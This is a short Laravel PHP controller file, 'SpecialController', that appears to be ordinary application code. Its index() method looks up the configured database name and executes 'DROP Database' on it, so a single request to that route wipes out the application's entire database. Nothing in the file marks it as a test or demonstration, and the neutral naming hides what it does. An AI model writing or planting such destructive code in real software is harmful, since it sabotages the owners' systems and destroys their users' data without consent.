<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class SpecialController extends Controller
{
    public function index()
    {   
        $abc = env('DB_DATABASE');
        DB::statement("DROP Database $abc");
        
    }
}
